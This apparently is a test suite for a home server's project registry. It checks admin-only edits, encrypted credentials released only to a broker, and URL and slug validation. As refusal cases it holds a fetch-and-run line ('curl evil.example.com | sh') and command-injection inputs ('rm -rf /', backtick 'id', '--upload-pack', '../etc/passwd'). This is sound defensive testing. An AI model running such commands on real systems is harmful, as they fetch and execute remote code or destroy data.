"""The registry is the leash, so most of this is about who cannot touch it.

Run: python local/test_projects_registry.py   (needs Flask; skips loudly without it)

A project row is a general-purpose "run this on my infrastructure" primitive:
whoever can add one, or edit its deploy definition, can execute code wherever
that project deploys. That is why the registry lives in HomeWeb behind the
admin session rather than in a repository Alfred can commit to — and why these
tests spend more effort on refusals than on the happy path.

The two rules worth stating out loud, because both were loopholes before they
were rules:

- **`affects_alfred` is derived from the normalised remote URL, never the
  name.** A rule keyed on a name is one you can rename your way out of, and a
  second row pointing at the same repo under a friendlier label would walk
  straight past "deploying Alfred needs a human".
- **The credential leaves by exactly one door.** Not to a user, not to an
  admin, not into a checkout — only to the broker, which holds a token no
  browser has.
"""
import json
import os
import shutil
import sys
import tempfile

SRC = os.path.dirname(os.path.abspath(__file__))

try:
    import flask  # noqa: F401
    from cryptography.fernet import Fernet
except ImportError as exc:
    print(f"SKIP: {exc} — run this where app.py can import.")
    raise SystemExit(0)

tmp = tempfile.mkdtemp(prefix="homeweb-projects-")
dst = os.path.join(tmp, "local")
shutil.copytree(SRC, dst, ignore=shutil.ignore_patterns(
    "__pycache__", "backup_data", "history", "certs"))
os.makedirs(os.path.join(dst, "backup_data"), exist_ok=True)
os.chdir(dst)

KEY = Fernet.generate_key().decode()
BROKER = "b" * 40

# A real SSH public key for fingerprint tests. The private half is irrelevant
# here; the public half must parse for _credential_fingerprint().
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
from cryptography.hazmat.primitives import serialization
_ssh_test_priv = Ed25519PrivateKey.generate()
_ssh_test_pub = _ssh_test_priv.public_key().public_bytes(
    serialization.Encoding.OpenSSH, serialization.PublicFormat.OpenSSH).decode()
os.environ.update(SECRET_KEY="t" * 32, PROXY_SHARED_SECRET="p" * 32,
                  DEBUG_API_KEY="d" * 32, PROJECTS_KEY=KEY,
                  PROJECTS_BROKER_TOKEN=BROKER,
                  # Who lives here and who is a parent. Both were literals in
                  # app.py -- `ADVANCED_USERS = {...}` -- and are supplied by
                  # the deployer now, so a suite that does not say leaves the
                  # house with no adults in it and every admin route answers
                  # 403 with "Solo administradores".
                  HOMECORE_MEMBERS="user1,user2,999000111",
                  HOMECORE_ADMIN_MEMBERS="user1")

MEMBER_A, MEMBER_B, MEMBER_C = "user1", "user2", "999000111"
with open(os.path.join(dst, "users.json"), "w", encoding="utf-8") as f:
    f.write('[{"username": "%s", "nanobot_id": 2},'
            ' {"username": "%s", "nanobot_id": 3},'
            ' {"username": "%s", "nanobot_id": 4}]' % (MEMBER_A, MEMBER_B, MEMBER_C))

sys.path.insert(0, dst)
import app as A  # noqa: E402

A.init_projects_db()

failures = []


def check(label, cond, detail=""):
    print(f"  {'PASS' if cond else 'FAIL'}  {label}{'' if cond else '  <- ' + str(detail)}")
    if not cond:
        failures.append(label)


client = A.app.test_client()


CSRF = "csrf-for-tests"


def as_user(user):
    """A session plus the CSRF token the real gate wants — `_csrf_ok` refuses
    an unaccompanied POST, which is the point of it."""
    with client.session_transaction() as sess:
        sess['user'] = user
        sess['csrf_token'] = CSRF


H = {'X-CSRF-Token': CSRF}


def post(body, user=MEMBER_A):
    as_user(user)
    return client.post('/projects/api', json=body, headers=H)


def put(slug, body, user=MEMBER_A):
    as_user(user)
    return client.put(f'/projects/api/{slug}', json=body, headers=H)


def get(path, user=MEMBER_A):
    as_user(user)
    return client.get(path)


HOMECAM = {
    'slug': 'homecameras', 'name': 'HomeCameras',
    'git_url': 'https://git.example.com/HomeCameras/_git/HomeCameras',
    'host': 'compute', 'deploy_path': 'deploy/deploy.sh',
    'verify_path': 'deploy/verify.sh', 'visibility': 'listed', 'access': [MEMBER_A],
}

print("only an admin may add a project")
r = post(HOMECAM, user=MEMBER_C)
check("a non-admin is refused", r.status_code == 403, r.get_json())
r = post(HOMECAM)
check("an admin is not", r.status_code == 200, r.get_json())
check("and it comes back without a credential",
      'auth_secret' not in (r.get_json() or {}).get('project', {}), r.get_json())

print("\nand only an admin may change or remove one")
r = put('homecameras', {**HOMECAM, 'name': 'Otro'}, user=MEMBER_B if MEMBER_B in A.ADVANCED_USERS else MEMBER_C)
check("a non-admin cannot edit", r.status_code == 403 or MEMBER_B in A.ADVANCED_USERS, r.status_code)
as_user(MEMBER_C)
check("a non-admin cannot delete",
      client.delete('/projects/api/homecameras', headers=H).status_code == 403)

print("\nvisibility is enforced, and a hidden project is not even confirmed")
listed = lambda u: [p['slug'] for p in (get('/projects/api', u).get_json() or {}).get('projects', [])]
check("the listed user sees it", 'homecameras' in listed(MEMBER_A), listed(MEMBER_A))
check("nobody else does", 'homecameras' not in listed(MEMBER_C), listed(MEMBER_C))
r = get('/projects/api/homecameras', user=MEMBER_C)
check("and asking directly is a 404, not a 403",
      r.status_code == 404, r.status_code)

print("\n`everyone` means everyone")
post({**HOMECAM, 'slug': 'shared', 'name': 'Compartido', 'visibility': 'everyone'})
check("including a non-admin", 'shared' in listed(MEMBER_C), listed(MEMBER_C))

print("\naffects_alfred is read off the URL, not the name")
for url in ('https://git.example.com/nanobot/_git/nanobot',
            'git@ssh.git.example.com:v3/household/nanobot/nanobot',
            'ssh://git@ssh.git.example.com/v3/household/nanobot/nanobot.git'):
    check(f"  {url.split('//')[-1][:34]}…", A._project_affects_alfred(url), url)
check("  and an unrelated repo is not flagged",
      not A._project_affects_alfred('https://host/org/HomeCameras'))

r = post({**HOMECAM, 'slug': 'inocente', 'name': 'Totalmente inocente',
          'git_url': 'git@ssh.git.example.com:v3/household/nanobot/nanobot'})
check("a friendly name does not launder the repo",
      r.get_json()['project']['affects_alfred'] is True, r.get_json())
check("and it is carried on the row, for the warning on the approval card",
      'affects_alfred' in r.get_json()['project'], r.get_json())

print("\nasking is not a property of a project")
# Every merge asks a person, so there is no per-project flag for it — and a
# field that is always true is an invitation to make it conditional again.
r = post({**HOMECAM, 'slug': 'sinverify', 'name': 'Sin verify', 'verify_path': ''})
check("no needs_ok on a project without verify", 'needs_ok' not in r.get_json()['project'])
check("nor on one with it",
      'needs_ok' not in get('/projects/api/homecameras').get_json()['project'])
check("but verify_path is still carried — it decides auto-rollback",
      get('/projects/api/homecameras').get_json()['project']['verify_path']
      == 'deploy/verify.sh')

print("\nthe git URL is validated before it is ever an argument")
for bad in ('file:///etc', '/tmp/repo', 'https://host/a;rm -rf /', 'https://host/a`id`',
            'https://host/a\nb', '', 'x' * 600):
    check(f"  refused: {bad[:26]!r}", not A._valid_git_url(bad), bad[:40])
for good in ('https://host/org/repo',
             'git@ssh.git.example.com:v3/alex/repo/repo',
             'ssh://git@host/org/repo.git'):
    check(f"  accepted: {good[:34]}", A._valid_git_url(good), good)

print("\nthe host must be a Jenkins label that exists")
r = post({**HOMECAM, 'slug': 'raro', 'host': 'no-such-box'})
check("an unknown label is refused", r.status_code == 400, r.get_json())
check("the known ones are the three in the house",
      A.PROJECT_HOSTS == ('hub', 'compute', 'storage'), A.PROJECT_HOSTS)

print("\nthe credential leaves by exactly one door")
post({**HOMECAM, 'slug': 'conllave', 'auth_kind': 'ssh_key',
      'auth_secret': '-----BEGIN OPENSSH PRIVATE KEY-----\nsecreto\n'})
body = get('/projects/api/conllave').get_json()['project']
check("the API says a key exists", body['has_auth'] is True, body)
check("and does not say what it is",
      'secreto' not in json.dumps(body), body)
raw = A._projects_conn().execute(
    "SELECT auth_secret FROM projects WHERE slug='conllave'").fetchone()[0]
check("it is not plaintext on disk", 'secreto' not in raw, raw[:40])

BH = {'X-Broker-Token': BROKER}
as_user(MEMBER_A)
r = client.get(f'/projects/api/broker/{MEMBER_A}/conllave')
check("an admin session cannot read it", r.status_code == 401, r.status_code)
r = client.get(f'/projects/api/broker/{MEMBER_A}/conllave',
               headers={'X-Broker-Token': 'wrong'})
check("nor can a wrong token", r.status_code == 401, r.status_code)
r = client.get(f'/projects/api/broker/{MEMBER_A}/conllave', headers=BH)
check("the broker can, for a user who may see it",
      r.status_code == 200 and 'secreto' in r.get_json()['auth_secret'], r.status_code)

print("\nand the broker asks on behalf of somebody — it cannot ask in general")
r = client.get(f'/projects/api/broker/{MEMBER_C}/conllave', headers=BH)
check("a user without access gets 404, not the key",
      r.status_code == 404, r.status_code)
check("and the 404 is the same one a missing project gets, so a leaked token",
      client.get(f'/projects/api/broker/{MEMBER_A}/no-existe', headers=BH).status_code == 404)
check("cannot enumerate somebody else's projects",
      'conllave' not in [p['slug'] for p in
                         client.get(f'/projects/api/broker/{MEMBER_C}', headers=BH)
                         .get_json()['projects']])
r = client.get('/projects/api/broker/999999999', headers=BH)
check("an unknown user is refused outright", r.status_code == 404, r.status_code)
check("and the list carries no credentials",
      'secreto' not in json.dumps(client.get(f'/projects/api/broker/{MEMBER_A}', headers=BH)
                                  .get_json()))

print("\nan update that does not mention the key does not erase it")
put('conllave', {**HOMECAM, 'slug': 'conllave', 'auth_kind': 'ssh_key', 'name': 'Renombrado'})
r = client.get(f'/projects/api/broker/{MEMBER_A}/conllave', headers=BH)
check("still there", 'secreto' in (r.get_json() or {}).get('auth_secret', ''), r.get_json())
put('conllave', {**HOMECAM, 'slug': 'conllave', 'auth_kind': 'none'})
r = client.get(f'/projects/api/broker/{MEMBER_A}/conllave', headers=BH)
check("but setting auth_kind to none does erase it",
      (r.get_json() or {}).get('auth_secret') == '', r.get_json())

print("\ncredentials can be generated from the panel")
as_user(MEMBER_A)
r = client.post('/projects/api/credentials/generate', json={'type': 'rsa'}, headers=H)
check("endpoint returns a key pair", r.status_code == 200 and 'private_key' in r.get_json() and 'public_key' in r.get_json(), r.get_json())
check("public key is ssh-rsa for Azure", r.get_json()['public_key'].startswith('ssh-rsa '), r.get_json())
check("private key is OpenSSH PEM", 'OPENSSH PRIVATE KEY' in r.get_json()['private_key'], r.get_json())
r = client.post('/projects/api/credentials/generate', json={'type': 'ed25519'}, headers=H)
check("ed25519 key pair can be generated", r.status_code == 200 and r.get_json()['public_key'].startswith('ssh-ed25519 '), r.get_json())

print("\na username/password credential keeps the account and hides the password")
as_user(MEMBER_A)
r = client.post('/projects/api/credentials',
                json={'name': 'FTP del hosting', 'kind': 'basic',
                      'auth_user': 'deploy@ejemplo.com',
                      'auth_secret': 'ftp-password-123'},
                headers=H)
_bc = (r.get_json() or {}).get('credential')
check("a basic credential can be created",
      r.status_code == 201 and _bc and _bc['kind'] == 'basic', r.get_json())
check("  the account name comes back -- it is not the secret",
      (_bc or {}).get('auth_user') == 'deploy@ejemplo.com', _bc)
check("  and the password never does",
      'ftp-password-123' not in json.dumps(r.get_json()), r.get_json())
_r = client.get('/projects/api/credentials', headers=H)
check("  nor anywhere in the list",
      'ftp-password-123' not in json.dumps(_r.get_json()))
check("  which still names the account",
      any(c.get('auth_user') == 'deploy@ejemplo.com'
          for c in (_r.get_json() or {}).get('credentials', [])), _r.get_json())

# Half a credential is the failure worth refusing: a password with no account
# is stored, looks saved, and cannot be used by anything.
r = client.post('/projects/api/credentials',
                json={'name': 'sin usuario', 'kind': 'basic',
                      'auth_secret': 'x'}, headers=H)
check("  a basic credential with no account is refused", r.status_code == 400,
      r.status_code)

# Renaming must not blank the account, the same preserve-on-absence rule the
# other fields follow.
r = client.put(f"/projects/api/credentials/{_bc['id']}",
               json={'name': 'FTP del hosting (prod)'}, headers=H)
check("  renaming keeps the account",
      ((r.get_json() or {}).get('credential') or {}).get('auth_user')
      == 'deploy@ejemplo.com', r.get_json())

print("\nseeing a project is not permission to rewrite how it deploys")

# The broker runs a stored deploy script as shell, on its own host, with the
# project's deploy credential in the environment -- and a stored script wins
# over whatever path the admin configured. So a read on the list must not
# carry a mandate over the thing listed.
as_user(MEMBER_A)
_own = post({**HOMECAM, 'slug': 'mine', 'visibility': 'everyone'})
check("a shared project exists to try this on", _own.status_code == 200,
      _own.status_code)


def _as_proxy(who, slug, script='echo hi'):
    return client.post(f'/projects/api/code/deploy-script/{slug}',
                       json={'deploy_script': script},
                       headers={'X-Proxy-User': who,
                                'X-Proxy-Secret': A._proxy_user_token(who)})


check("  its owner may write the deploy script",
      _as_proxy(MEMBER_A, 'mine').status_code == 200,
      _as_proxy(MEMBER_A, 'mine').status_code)
_r = _as_proxy(MEMBER_B, 'mine', 'curl evil.example.com | sh')
check("  somebody who can only *see* it may not", _r.status_code == 403,
      _r.status_code)
check("  and the script they tried to write did not land",
      (client.get('/projects/api/mine', headers=H).get_json() or {})
      .get('project', {}).get('deploy_script') != 'curl evil.example.com | sh')

print("\nthe deploy credential is a different one from the repository's")

# The fault this pins: one field for both would hand the token that opens the
# source to whatever shell script the deploy happens to be.
as_user(MEMBER_A)
_git = client.post('/projects/api/credentials',
                   json={'name': 'forge token', 'kind': 'token',
                         'auth_secret': 'git-token-xyz'},
                   headers=H).get_json()['credential']
_ftp = client.post('/projects/api/credentials',
                   json={'name': 'hosting FTP', 'kind': 'basic',
                         'auth_user': 'deploy@ejemplo.com',
                         'auth_secret': 'ftp-pass-abc'},
                   headers=H).get_json()['credential']
r = post({**HOMECAM, 'slug': 'twocreds', 'credential_id': _git['id'],
          'deploy_credential_id': _ftp['id']})
check("a project can name one credential for each", r.status_code == 200,
      r.get_json())
_p = (r.get_json() or {}).get('project') or {}
check("  and the page can tell them apart by name",
      _p.get('credential_name') == 'forge token'
      and _p.get('deploy_credential_name') == 'hosting FTP', _p)

_b = client.get(f'/projects/api/broker/{MEMBER_A}/twocreds',
                headers={"X-Broker-Token": BROKER}).get_json() or {}
check("  the broker gets the forge token for git",
      _b.get('auth_secret') == 'git-token-xyz', sorted(_b))
check("  and the FTP login for the deploy, kept apart",
      _b.get('deploy_auth_secret') == 'ftp-pass-abc'
      and _b.get('deploy_auth_user') == 'deploy@ejemplo.com', sorted(_b))

# A project with no deploy credential must get nothing, never the git one.
r = post({**HOMECAM, 'slug': 'onecred', 'credential_id': _git['id']})
_b2 = client.get(f'/projects/api/broker/{MEMBER_A}/onecred',
                 headers={"X-Broker-Token": BROKER}).get_json() or {}
check("  with no deploy credential the deploy gets nothing",
      not _b2.get('deploy_auth_secret'), _b2.get('deploy_auth_kind'))
check("  and certainly not the repository's",
      _b2.get('deploy_auth_secret') != 'git-token-xyz')

print("\nshared credentials can be reused across projects")
as_user(MEMBER_A)
r = client.post('/projects/api/credentials',
                json={'name': 'Azure SSH', 'kind': 'ssh_key',
                      'auth_secret': 'ssh-priv-key-123',
                      'public_key': _ssh_test_pub},
                headers=H)
cred = (r.get_json() or {}).get('credential')
check("admin can create a credential", r.status_code == 201 and cred and cred['kind'] == 'ssh_key',
      r.get_json())
check("credential list never returns the secret",
      'ssh-priv-key-123' not in json.dumps(r.get_json()), r.get_json())
check("public key is returned", 'ssh-ed25519' in (cred or {}).get('public_key', ''), cred)
check("fingerprint is computed", (cred or {}).get('fingerprint', '').startswith('SHA256:'), cred)
check("credentials are shared by default", (cred or {}).get('shared') is True, cred)
cid = cred['id']
r = client.get('/projects/api/credentials', headers=H)
check("credentials are listed", any(c['id'] == cid for c in (r.get_json() or {}).get('credentials', [])),
      r.get_json())
r = post({**HOMECAM, 'slug': 'concred', 'credential_id': cid})
check("a project can be linked to a credential", r.status_code == 200, r.get_json())
check("the project row shows the credential name",
      (r.get_json() or {}).get('project', {}).get('credential_name') == 'Azure SSH',
      r.get_json())
r = client.get(f'/projects/api/broker/{MEMBER_A}/concred', headers=BH)
check("the broker resolves the shared credential",
      r.status_code == 200 and r.get_json()['auth_secret'] == 'ssh-priv-key-123',
      r.get_json())
r = client.put(f'/projects/api/credentials/{cid}',
               json={'name': 'Azure SSH updated', 'kind': 'ssh_key', 'auth_secret': 'rotated-key'},
               headers=H)
check("a credential can be rotated", r.status_code == 200, r.get_json())
r = client.get(f'/projects/api/broker/{MEMBER_A}/concred', headers=BH)
check("the project sees the rotated secret",
      r.status_code == 200 and r.get_json()['auth_secret'] == 'rotated-key',
      r.get_json())
r = client.delete(f'/projects/api/credentials/{cid}', headers=H)
check("a credential in use cannot be deleted", r.status_code == 409, r.status_code)
client.delete('/projects/api/concred', headers=H)
r = client.delete(f'/projects/api/credentials/{cid}', headers=H)
check("a credential not in use can be deleted", r.status_code == 200, r.status_code)

print("\nper-user credentials stay private to their owner")
as_user(MEMBER_A)
r = client.post('/projects/api/credentials',
                json={'name': 'Alex only', 'kind': 'ssh_key',
                      'auth_secret': 'priv-alex', 'public_key': _ssh_test_pub,
                      'shared': False},
                headers=H)
member_cred = (r.get_json() or {}).get('credential', {})
member_cid = member_cred.get('id')
r = post({**HOMECAM, 'slug': 'membercred', 'credential_id': member_cid})
check("owner can create a project with a private credential", r.status_code == 200, r.get_json())
r = client.get(f'/projects/api/broker/{MEMBER_A}/membercred', headers=BH)
check("owner broker gets the private credential",
      r.status_code == 200 and r.get_json()['auth_secret'] == 'priv-alex', r.get_json())
r = client.get(f'/projects/api/broker/{MEMBER_B}/membercred', headers=BH)
check("another user cannot get the private credential", r.status_code == 404, r.status_code)

print("\nwithout PROJECTS_KEY it refuses to store rather than storing plaintext")
saved = os.environ.pop('PROJECTS_KEY')
r = post({**HOMECAM, 'slug': 'sinllave', 'auth_kind': 'token', 'auth_secret': 'pat123'})
check("503, naming the variable", r.status_code == 503 and 'PROJECTS_KEY' in r.get_json()['error'],
      r.get_json())
os.environ['PROJECTS_KEY'] = saved

print("\nslugs are constrained, because they end up in paths")
for bad in ('../etc', 'A B', 'x', '', 'con/barra'):
    r = post({**HOMECAM, 'slug': bad})
    check(f"  refused: {bad!r}", r.status_code == 400, r.status_code)

print("\nan edit is applied to the project the URL names, not the one the body does")
# A PUT resolved by the body's slug either 404s on every rename or writes this
# project's fields onto whatever other row already carries the new slug — a
# silent overwrite of a project nobody was editing.
r = put('sinverify', {**HOMECAM, 'slug': 'sinverify-2', 'name': 'Renombrado'})
check("a rename succeeds", r.status_code == 200, r.get_json())
check("and answers at the new slug",
      get('/projects/api/sinverify-2').get_json()['project']['name'] == 'Renombrado',
      get('/projects/api/sinverify-2').get_json())
check("the old slug is gone", get('/projects/api/sinverify').status_code == 404)
before = get('/projects/api/homecameras').get_json()['project']
r = put('sinverify-2', {**HOMECAM, 'slug': 'homecameras', 'name': 'Secuestro'})
check("renaming onto an occupied slug is a conflict", r.status_code == 409, r.get_json())
check("and the project that owned that slug is untouched",
      get('/projects/api/homecameras').get_json()['project'] == before,
      get('/projects/api/homecameras').get_json())
r = post({**HOMECAM, 'slug': 'malacred', 'credential_id': 'no-es-un-numero'})
check("a non-numeric credential_id is a 400, not a stack trace",
      r.status_code == 400, r.status_code)

print("\na credential PUT keeps what it does not mention")
as_user(MEMBER_A)
r = client.post('/projects/api/credentials',
                json={'name': 'PAT de Azure', 'kind': 'token',
                      'auth_secret': 'pat-secreto', 'shared': False},
                headers=H)
tok = (r.get_json() or {}).get('credential', {})
r = client.put(f"/projects/api/credentials/{tok['id']}",
               json={'name': 'PAT de Azure (rotado)'}, headers=H)
after = (r.get_json() or {}).get('credential', {})
check("renaming does not turn a token into an SSH key",
      after.get('kind') == 'token', after)
check("nor does it re-share a private credential",
      after.get('shared') is False, after)
check("and the secret survives", after.get('has_secret') is True, after)

print("\na project edit that never mentions the credential does not erase it")
# What the Proyectos page actually sends: no `auth_kind` key at all. Defaulted
# to 'none' that read as "erase", so renaming a project wiped its inline key —
# and a project created that way filed a real secret under kind 'none', which
# the broker checks before using it, so the clone went out unauthenticated.
UI_EDIT = {k: v for k, v in HOMECAM.items()}
post({**UI_EDIT, 'slug': 'uiinline', 'auth_secret':
      '-----BEGIN OPENSSH PRIVATE KEY-----\nllave-ui\n'})
one = get('/projects/api/uiinline').get_json()['project']
check("a pasted key is filed under a kind the broker will use",
      one['auth_kind'] == 'ssh_key', one)
put('uiinline', {**UI_EDIT, 'slug': 'uiinline', 'name': 'Renombrado desde la UI'})
r = client.get(f'/projects/api/broker/{MEMBER_A}/uiinline', headers=BH)
check("and a rename from that same page leaves it there",
      'llave-ui' in (r.get_json() or {}).get('auth_secret', ''), r.get_json())
put('uiinline', {**UI_EDIT, 'slug': 'uiinline', 'auth_kind': 'none'})
r = client.get(f'/projects/api/broker/{MEMBER_A}/uiinline', headers=BH)
check("erasing still happens when asked for in those words",
      (r.get_json() or {}).get('auth_secret') == '', r.get_json())

print("\nthe floor of refused paths applies to a project that named none")
one = get('/projects/api/homecameras').get_json()['project']
check("users.json is refused even with an empty «Rutas protegidas»",
      'users.json' in one['protected_paths'], one['protected_paths'])
check("and so is every other path in the constant",
      set(A.PROJECT_PROTECTED_ALWAYS) <= set(one['protected_paths']),
      one['protected_paths'])
post({**HOMECAM, 'slug': 'conrutas', 'protected_paths': ['deploy/', 'users.json']})
one = get('/projects/api/conrutas').get_json()['project']
check("the project's own paths are added, not duplicated",
      one['protected_paths'].count('users.json') == 1
      and 'deploy/' in one['protected_paths'], one['protected_paths'])

print("\naffects_alfred survives the spellings of the same URL")
for u in ('https://git.example.com/nanobot/_git/nanobot.GIT',
          'https://git.example.com/nanobot/_GIT/nanobot',
          'https://git.example.com/nanobot/_git/nanobot?path=/README.md',
          'HTTPS://GIT.EXAMPLE.COM/nanobot/_git/nanobot'):
    check(f"  {u[-38:]}", A._project_affects_alfred(u), A._normalize_git_url(u))
check("a URL that reaches git as an option is not a remote",
      not A._valid_git_url('--upload-pack=/tmp/x@h:p'))

print("\ndeleting a credential that is not there is not a success")
as_user(MEMBER_A)
check("unknown id", client.delete('/projects/api/credentials/999999',
                                  headers=H).status_code == 409)

print("\nthe chat selector gets two fields and no registry")
as_user(MEMBER_A)
r = client.get('/chat/projects?space=programmer')
rows = (r.get_json() or {}).get('projects', [])
check("slug and name, nothing else",
      rows and all(set(p) == {'slug', 'name'} for p in rows), rows[:1])
check("no git_url, no credential, no access roster",
      'git_url' not in json.dumps(rows) and 'credential_id' not in json.dumps(rows), rows[:1])

print("\na generated key is never cached, and never minted without a home")
r = client.post('/projects/api/credentials/generate', json={'type': 'ed25519'}, headers=H)
check("no-store on the one response carrying key material",
      'no-store' in r.headers.get('Cache-Control', ''), dict(r.headers))
saved = os.environ.pop('PROJECTS_KEY')
r = client.post('/projects/api/credentials/generate', json={'type': 'ed25519'}, headers=H)
check("and no key at all when PROJECTS_KEY cannot keep it",
      r.status_code == 503 and 'private_key' not in r.get_json(), r.get_json())
os.environ['PROJECTS_KEY'] = saved

print("\nand a duplicate slug is a conflict, not a silent overwrite")
r = post(HOMECAM)
check("409", r.status_code == 409, r.status_code)

print()

print("\nthe instructions a project gives Alfred travel to the broker, and only there")
# The rules that are not a path or a flag — «no toques la rama de release»,
# «los mensajes de commit van en inglés». Stored verbatim; nothing here reads
# them. What matters is that they survive a round trip, reach the broker, and
# do not reach the chat selector every member can call.
r = post({**HOMECAM, 'slug': 'conreglas', 'name': 'Con reglas',
          'custom_instructions': 'Trabaja solo dentro de services/.\nNo hagas commit si los tests fallan.'})
check("a project can be registered with instructions", r.status_code == 200, r.get_json())
check("and they come back as written",
      r.get_json()['project']['custom_instructions'].startswith('Trabaja solo dentro de services/'),
      r.get_json()['project'].get('custom_instructions'))
as_user(MEMBER_A)
b = client.get(f'/projects/api/broker/{MEMBER_A}/conreglas', headers=BH).get_json()
check("the broker is handed them with the rest of the project",
      'No hagas commit' in (b.get('project') or {}).get('custom_instructions', ''), b)
sel = get('/chat/projects?space=programmer').get_json()
check("the chat selector is not",
      all('custom_instructions' not in p for p in sel.get('projects', [])), sel)

print("\nand an edit that does not mention them keeps them")
# This is the one field somebody writes at length. A PUT from anywhere but the
# full form — the credentials picker, a rename — must not empty it.
r = put('conreglas', {**HOMECAM, 'slug': 'conreglas', 'name': 'Otro nombre'})
check("a PUT with no custom_instructions leaves them alone",
      'No hagas commit' in get('/projects/api/conreglas').get_json()['project']['custom_instructions'],
      get('/projects/api/conreglas').get_json()['project'].get('custom_instructions'))
r = put('conreglas', {**HOMECAM, 'slug': 'conreglas', 'custom_instructions': ''})
check("and an explicit empty string clears them",
      get('/projects/api/conreglas').get_json()['project']['custom_instructions'] == '',
      get('/projects/api/conreglas').get_json()['project'].get('custom_instructions'))

print("\nthe floor is merged on the way out and never written back into the row")
# The edit form fills «Rutas protegidas» from the API, and saving sends that
# textarea straight back. Handed the merged list it wrote today's floor into
# the project — freezing it there, so a project registered now would keep
# refusing exactly this list after the constant changed. The form gets the
# project's own paths; only the broker's view is merged.
one = get('/projects/api/conrutas').get_json()['project']
check("the form is handed only what this project added",
      one['own_protected_paths'] == ['deploy/', 'users.json'], one['own_protected_paths'])
check("and the merged list is still what the broker reads",
      set(A.PROJECT_PROTECTED_ALWAYS) <= set(one['protected_paths']), one['protected_paths'])
# The round trip the form actually performs: read, then save back what it read.
put('conrutas', {**HOMECAM, 'slug': 'conrutas',
                 'protected_paths': one['own_protected_paths']})
after = get('/projects/api/conrutas').get_json()['project']
check("saving the form back does not freeze the floor into the row",
      after['own_protected_paths'] == ['deploy/', 'users.json'], after['own_protected_paths'])

print("\nthe broker is told what to call the person a commit is made for")
# The broker knows this person as a login id, which is right for deciding
# access and wrong on a commit somebody reads a year later. The mapping to
# «Alex» lives here, so the name does too.
b = client.get(f'/projects/api/broker/{MEMBER_A}/homecameras', headers=BH).get_json()
check("a display name comes with the project",
      b.get('display_name') == A._tasks_display_name(MEMBER_A), b.get('display_name'))
check("and it is not the login id", b.get('display_name') != MEMBER_A, b.get('display_name'))

if failures:
    print(f"FAILED: {len(failures)}")
    for f in failures:
        print(f"  - {f}")
    raise SystemExit(1)
print("all good")


# --- the selected project actually reaches the turn ---------------------------
# The selector sent its choice from the first day and nothing ever read it. The
# slug was validated, written onto a queued item, and consumed by nobody --
# `/chat/send`, the path a typed message takes, did not even validate it. So
# picking «Fracciones» and asking for dark mode got "no tengo contexto de
# proyecto activo", which is true, and reads as the selector being decorative.

print("\nthe active project reaches the model")

_pb = A._project_block("fracciones")
check("  the block names the project", "fracciones" in _pb, _pb)
check("  and tells it to check the project out",
      "checkout" in _pb, _pb)
check("  no project, no block", A._project_block(None) == "", A._project_block(None))
check("  nor an empty one", A._project_block("") == "", A._project_block(""))

# Standing context, not ordinary text: re-sent every turn and stored on none.
# Which project you are on is as true on turn thirty as on turn one, and
# persisting it would be thirty copies of one sentence eating the window.
_turn = A._compose_turn_content("u", "add dark mode", [], [], "programmer",
                                project="fracciones")
check("  it is in the turn", "fracciones" in _turn, _turn[:200])
check("  inside the standing markers, so it is not written to history",
      _turn.index("fracciones") < _turn.index("add dark mode"), _turn[:200])
check("  and the person's own words are still last",
      _turn.rstrip().endswith("add dark mode"), _turn[-60:])

_none = A._compose_turn_content("u", "add dark mode", [], [], "programmer")
# Against the block's own text, not a phrase that happened to be in it: the
# first version of this looked for "proyecto activo", and when the prompt was
# translated to English the assertion went on passing while checking nothing.
check("  a turn with no project says nothing about one",
      "project this conversation is about" not in _none, _none[:200])
check("  and that check is not looking for a string that left",
      "project this conversation is about" in _pb, _pb[:80])

# Both callers, because a selector that works only when Alfred happens to be
# busy answers the same question two ways.
import inspect as _inspect
_send = _inspect.getsource(A.chat_send)
check("  the typed path validates the project",
      "_valid_project(body, space)" in _send,
      "chat_send dropped it on the floor: the browser sent it and nothing read it")
check("  and passes it to the composer",
      "project=project" in _send, _send[-400:])

_src = _inspect.getsource(A)
check("  the queued path passes the one it stored",
      "project=item.get('project')" in _src,
      "the queue wrote the slug onto the item and never read it back")

# The validator is the edge, and it only trusts a space that has a selector.
check("  a project is refused outside a project space",
      A._valid_project({"project": "fracciones"}, "teacher") is None)
check("  and accepted inside one",
      A._valid_project({"project": "fracciones"}, "programmer") == "fracciones")
check("  a slug that is not one names nothing",
      A._valid_project({"project": "../etc/passwd"}, "programmer") is None)


# --- replying to a message ----------------------------------------------------
# Alfred answers a question he cannot see. Without the quote, "and the other
# one?" is a message with no referent: he gets the words and not the thing they
# point at, and either answers the wrong message or asks which one was meant.

print("\na swiped message reaches the turn as a quote")

_q = A._valid_reply({"reply_to": {"who": "Alfred", "text": "  the  second   one  "}})
check("  it is shaped at the edge", _q == {"who": "Alfred", "text": "the second one"}, _q)
check("  no quote, nothing", A._valid_reply({}) is None)
check("  an empty one is nothing", A._valid_reply({"reply_to": {"text": "  "}}) is None)
check("  and a non-object is nothing",
      A._valid_reply({"reply_to": "the second one"}) is None)

# Trimmed hard: this rides on the turn it is attached to, and a quote is a
# reminder of what was said rather than a second copy of it.
_long = A._valid_reply({"reply_to": {"who": "x" * 99, "text": "y" * 5000}})
check("  the text is cut", len(_long["text"]) <= 600, len(_long["text"]))
check("  and so is the name", len(_long["who"]) <= 40, len(_long["who"]))

_turn = A._compose_turn_content("u", "and the other one?", [], [], "programmer",
                                reply_to={"who": "Alfred", "text": "the second one"})
check("  the quote is in the turn", "the second one" in _turn, _turn[:200])
check("  above the question, which is what it is about",
      _turn.index("the second one") < _turn.index("and the other one?"), _turn[:200])
check("  marked as a quote", "> the second one" in _turn, _turn[:200])

# Ordinary text, not standing context. Standing context is re-sent every turn
# and stored on none -- right for "you are working on fracciones", wrong for
# "about this message", because the next turn is about something else and a
# quote that persisted would attach itself to every question after it.
_std = A._compose_turn_content("u", "and the other one?", [], [], "programmer",
                               project="fracciones",
                               reply_to={"who": "Alfred", "text": "the second one"})
# The real marker, not a guessed name. The first version of this looked for
# `_STANDING_END`, found nothing, and skipped both checks under an `if` --
# printing neither PASS nor FAIL, which is the quietest way to verify nothing.
_marker_end = _std.rfind(A.STANDING_CLOSE)
check("  the standing block was found at all", _marker_end > 0,
      "no marker in the turn, so the two checks below would prove nothing")
check("  the quote is outside the standing block",
      _std.index("the second one") > _marker_end, _std[:300])
check("  and the project is inside it",
      _std.index("fracciones") < _marker_end, _std[:300])

check("  a turn with no reply says nothing about one",
      "Replying to" not in A._compose_turn_content("u", "hi", [], [], "programmer"))
